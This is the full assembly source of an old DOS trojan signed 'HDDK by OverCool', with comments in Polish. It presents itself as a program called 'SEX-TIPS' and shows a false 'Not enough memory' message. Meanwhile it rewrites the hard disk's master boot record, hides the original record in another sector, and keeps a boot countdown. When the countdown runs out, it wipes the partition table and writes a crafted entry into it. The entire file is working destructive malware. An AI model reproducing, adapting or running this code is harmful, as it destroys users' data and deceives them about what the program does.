.Model Tiny
.Data
.286
 Bufor db 512 dup (0)
 Mem db 'Not enough memory...',13,10,'$'
 WinMsg db 'SEX-TIPS can`t work in Windows 95 enviroment...',13,10
        db 'You must back to DOS MODE, and run it again.','$'

 Licznik = 1

.Code
 Org 100h
 jumps

 Begin:
  jmp Check       ; skok do poczatku programu

  Partition:      ; Procedura Partition
   xor ax,ax
   mov ss,ax
   mov sp,7c00h   ; stos jest ustawiany tak jak w orginale
   mov ax,9000h
   mov es,ax      ; es:bx = [9000:0000] - adres pod ktory zostanie wczytana procedura FloppyKiller
   xor bx,bx
   mov ax,0201h
   mov cx,0003h   ; 3 sektor
   mov dx,0080h
   push es        ; adres es:bx na stos
   push bx
   int 13h        ; odczyt sektora 3,4
   retf           ; uruchomienie procedury FlopyKiller...
   Pointer db 'HDDK by OverCool',0  ; Znacznik

  FloppyKillerCode:  ; Procedura FlopyKiller
   jmp Compare

   Sekwencja db 00h,00h,01h,00h,05h,00h,0B8h,0Bh,01h,00h,00h,00h,0BCh,01h,00h,00h

 Compare:
  mov ax,8000h
  mov es,ax
  mov ax,0201h
  mov cx,0006h
  mov dx,0080h
  mov bx,0000h
  int 13h      ; odczytanie licznika z 6 sektora dysku twardego

  cmp word ptr es:[0],0 ; sprawdzenie licznika
  jz KillFDD
  sub word ptr es:[0],1  ; zmliejszenie licznika o 1

  mov ax,0301h
  mov cx,0006h
  mov dx,0080h
  mov bx,0000h
  int 13h         ; zapisanie zmniejszonego licznika do 6 sektora


  jmp LoadOldPart ; skok do procedury ladujacej orginalny boot rekord

 KillFDD:         ; procedura wylaczajaca IRQ #6 - przerwanie sprzetowe FDD


  mov ax,5000h
  mov es,ax
  mov ax,0201h
  mov cx,0002h
  mov dx,0080h
  mov bx,0000h
  int 13h      ; zaladowanie do 5000:0000 tablicy partycji

  xor ax,ax
  mov di,1BEh
  mov cx,31
  rep stosb


  mov ax,9000h
  mov ds,ax


  mov cx,16
  mov si,(Sekwencja-FloppyKillerCode)
  mov di,1DEh
  cld
  rep movsb

  mov ax,0301h
  mov cx,0001h
  mov dx,0080h
  mov bx,0000h
  int 13h


  LoadOldPart:     ; ladowanie orginalnego Boot Rekordu

   xor ax,ax
   mov es,ax
   mov ax,0201h
   mov cx,0002h
   mov dx,0080h
   mov bx,7c00h
   push es
   push bx
   int 13h       ; zaladowanie go pod adres 0000:7c00h
   retf          ; i uruchomienie go...

   counter db Licznik  ; liczink

  FloppyKillerEndOfCode:

  Check:
   mov ax,0003h
   int 10h
   mov ax,1600h          ; wywolanie odpowiedniej funkcji przerwania 2fh
   int 2fh
   cmp al,4
   jb NoWin                 ; jezeli al>4 to nie ma windows'a

   mov ah,09h
   lea dx,WinMsg
   int 21h             ; informacja
   mov ax,0e07h
   int 10h
   xor ax,ax
   int 16h
   ret


 NoWin:
   mov ax,0201h
   mov cx,0001h
   mov dx,0080h
   mov bx,Offset Bufor
   int 13h             ; odczyt tablicy partycji do bufora

   mov cx,(FloppyKillerCode-Partition)  ; cx = dlugosc procedury Partition
   mov si,Offset Partition
   mov di,Offset Bufor
   cld
   rep cmpsb                            ; sprawdzenie czy jest juz zainstalowany
   jne Install                          ; jezeli nie to instaluj

   mov ah,09h
   lea dx,Mem
   int 21h        ; informacja o deinstalacji
   xor ax,ax
   int 16h
   ret            ; zakonczenie programu



  Install:        ; czesc instalacyjna programu
   mov ax,0301h
   mov cl,2h
   int 13h        ; Przesuniecie orinalnej tablicy partycji do 2 sektora
   jc Error

   mov cx,(FloppyKillerCode-Partition)  ; cx = dlugosc procedury Partition
   mov si,offset Partition
   mov di,offset Bufor
   cld
   rep movsb      ; zmiana kodu boot-rekordu

   mov ax,0301h
   mov cx,0001h
   int 13h        ; Zapis tablicy partycji z nowym boot-rekordem do 1 sektora
   jc Error

   mov di,offset Bufor         ; wyczyszczenie bufora
   mov cx,256
   xor ax,ax
   cld
   rep stosw

   mov Bufor[0],Licznik       ; zapis licznika do bufora
   mov ax,0301h
   mov cx,0006h
   mov dx,0080h
   int 13h
   jc Error


   mov cx,(FloppyKillerEndOfCode-FloppyKillerCode) ; cx = dlugosc procedury FloppyKiller

   mov bx,offset FloppyKillerCode
   mov ax,0301h
   mov cx,0003h
   int 13h      ; zapis procedury FloppyKiller do 3,4 sektora
   jc Error

   mov ah,09h
   lea dx,Mem
   int 21h        ; informacja o deinstalacji
   xor ax,ax
   int 16h
   ret            ; zakonczenie programu


  Error:   ret          ; zakonczenie dzialania programu

  f db 1000 dup ('!@#$%^&*( Nadmiar sexu zrobi z ciebie krotkowidza...    ')

 End Begin






